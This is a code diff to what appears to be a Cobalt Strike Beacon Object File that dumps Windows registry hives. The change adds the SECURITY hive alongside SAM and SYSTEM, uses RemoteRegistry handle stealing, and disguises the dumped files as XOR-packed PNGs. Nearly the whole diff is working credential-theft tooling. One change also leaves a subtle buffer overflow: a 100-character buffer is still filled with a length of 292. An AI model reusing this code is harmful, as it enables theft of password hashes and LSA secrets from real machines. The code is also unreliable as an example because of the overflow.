@@ -33,6 +33,9 @@ typedef struct _SYSTEM_HANDLE_INFORMATION_EX {
 static const WCHAR SAM_KEY_PATH[] = L"\\REGISTRY\\MACHINE\\SAM";
 static const ULONG SAM_KEY_PATH_LEN = 21;
 
+static const WCHAR SECURITY_KEY_PATH[] = L"\\REGISTRY\\MACHINE\\SECURITY";
+static const ULONG SECURITY_KEY_PATH_LEN = 26;
+
 static const char HEXA[17] = "0123456789abcdef";
 
 static const BYTE PNG_SIG[8] = { 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A };
@@ -610,6 +613,7 @@ void go(char * args, int alen)
     BOOL keepTemp = FALSE;
     char * samPath = NULL;
     char * sysPath = NULL;
+    char * secPath = NULL;
 
     char * tok;
     while ((tok = NextToken(&p)) != NULL) {
@@ -617,10 +621,11 @@ void go(char * args, int alen)
         else if (tok[0] == 'k' && tok[1] == '=') keepTemp = (tok[2] == '1');
         else if (tok[0] == 's' && tok[1] == 'a' && tok[2] == 'm' && tok[3] == '=') samPath = tok + 4;
         else if (tok[0] == 's' && tok[1] == 'y' && tok[2] == 's' && tok[3] == '=') sysPath = tok + 4;
+        else if (tok[0] == 's' && tok[1] == 'e' && tok[2] == 'c' && tok[3] == '=') secPath = tok + 4;
     }
 
-    if (!samPath && !sysPath) {
-        BeaconPrintf(0, "[!] usage: go p=<1|0> k=<0|1> sam=<path> sys=<path>\n");
+    if (!samPath && !sysPath && !secPath) {
+        BeaconPrintf(0, "[!] usage: go p=<1|0> k=<0|1> sam=<path> sys=<path> sec=<path>\n");
         BeaconPrintf(0, "[!] p: XOR+PNG pack (default 1), k: keep plaintext .tmp (default 0)\n");
         return;
     }
@@ -641,26 +646,47 @@ void go(char * args, int alen)
 
     BOOL samOk = FALSE;
     BOOL sysOk = FALSE;
+    BOOL secOk = FALSE;
+
+    WCHAR samTmpW[120], samOutW[120];
+    WCHAR secTmpW[120], secOutW[120];
+    samTmpW[0] = 0; samOutW[0] = 0;
+    secTmpW[0] = 0; secOutW[0] = 0;
 
     if (samPath) {
-        WCHAR samTmpW[300];
-        WCHAR samOutW[300];
-        AsciiToWide(samPath, samTmpW, 296);
-        WCpy(samOutW, samTmpW, 300);
-        WCat(samTmpW, L".tmp", 300);
+        AsciiToWide(samPath, samTmpW, 116);
+        WCpy(samOutW, samTmpW, 120);
+        WCat(samTmpW, L".tmp", 120);
+    }
+    if (secPath) {
+        AsciiToWide(secPath, secTmpW, 116);
+        WCpy(secOutW, secTmpW, 120);
+        WCat(secTmpW, L".tmp", 120);
+    }
 
+    if (samPath || secPath) {
         SVCSTATE st;
         DWORD pid = AcquireService(L"RemoteRegistry", &st);
         if (pid) {
             BeaconPrintf(0, "[+] RemoteRegistry pid %lu\n", pid);
             HKEY hRemote;
             if (ADVAPI32$RegConnectRegistryW(L"\\\\localhost", HKEY_LOCAL_MACHINE, &hRemote) == ERROR_SUCCESS) {
-                HKEY hSam;
-                if (ADVAPI32$RegOpenKeyExW(hRemote, L"SAM", 0, KEY_READ, &hSam) == ERROR_SUCCESS) {
-                    samOk = StealAndSave(pid, typeIdx, SAM_KEY_PATH, SAM_KEY_PATH_LEN, samTmpW, samPath);
-                    ADVAPI32$RegCloseKey(hSam);
-                } else {
-                    BeaconPrintf(0, "  [-] remote SAM open failed\n");
+                HKEY hHive;
+                if (samPath) {
+                    if (ADVAPI32$RegOpenKeyExW(hRemote, L"SAM", 0, KEY_READ, &hHive) == ERROR_SUCCESS) {
+                        samOk = StealAndSave(pid, typeIdx, SAM_KEY_PATH, SAM_KEY_PATH_LEN, samTmpW, samPath);
+                        ADVAPI32$RegCloseKey(hHive);
+                    } else {
+                        BeaconPrintf(0, "  [-] remote SAM open failed\n");
+                    }
+                }
+                if (secPath) {
+                    if (ADVAPI32$RegOpenKeyExW(hRemote, L"SECURITY", REG_OPTION_BACKUP_RESTORE, KEY_READ, &hHive) == ERROR_SUCCESS) {
+                        secOk = StealAndSave(pid, typeIdx, SECURITY_KEY_PATH, SECURITY_KEY_PATH_LEN, secTmpW, secPath);
+                        ADVAPI32$RegCloseKey(hHive);
+                    } else {
+                        BeaconPrintf(0, "  [-] remote SECURITY open failed: %lu\n", KERNEL32$GetLastError());
+                    }
                 }
                 ADVAPI32$RegCloseKey(hRemote);
             } else {
@@ -680,10 +706,24 @@ void go(char * args, int alen)
                 KERNEL32$MoveFileW(samTmpW, samOutW);
             }
             if (keepTemp) {
-                WCHAR keep[300];
-                AsciiToWide(samPath, keep, 292);
-                WCat(keep, L".tmp", 300);
+                WCHAR keep[100];
+                AsciiToWide(samPath, keep, 92);
+                WCat(keep, L".tmp", 100);
                 KERNEL32$MoveFileW(samTmpW, keep);
+            }
+        }
+        if (secOk) {
+            if (packPng) {
+                if (PackPng(secTmpW, secOutW, TRUE))
+                    BeaconPrintf(0, "  [+] packed %s\n", secPath);
+            } else {
+                KERNEL32$MoveFileW(secTmpW, secOutW);
+            }
+            if (keepTemp) {
+                WCHAR keep[100];
+                AsciiToWide(secPath, keep, 92);
+                WCat(keep, L".tmp", 100);
+                KERNEL32$MoveFileW(secTmpW, keep);
             }
         }
     }
@@ -709,9 +749,9 @@ void go(char * args, int alen)
                 KERNEL32$MoveFileW(sysTmpW, sysOutW);
             }
             if (keepTemp) {
-                WCHAR keep[300];
+                WCHAR keep[100];
                 AsciiToWide(sysPath, keep, 292);
-                WCat(keep, L".tmp", 300);
+                WCat(keep, L".tmp", 100);
                 KERNEL32$MoveFileW(sysTmpW, keep);
             }
         }
@@ -724,7 +764,8 @@ void go(char * args, int alen)
         BeaconPrintf(0, "[+] boot key %s\n", hex);
     }
 
-    BeaconPrintf(0, "[*] DONE sam=%s system=%s\n",
+    BeaconPrintf(0, "[*] DONE sam=%s system=%s sec=%s\n",
         samPath ? (samOk ? "OK" : "FAIL") : "skip",
-        sysPath ? (sysOk ? "OK" : "FAIL") : "skip");
+        sysPath ? (sysOk ? "OK" : "FAIL") : "skip",
+        secPath ? (secOk ? "OK" : "FAIL") : "skip");
 }
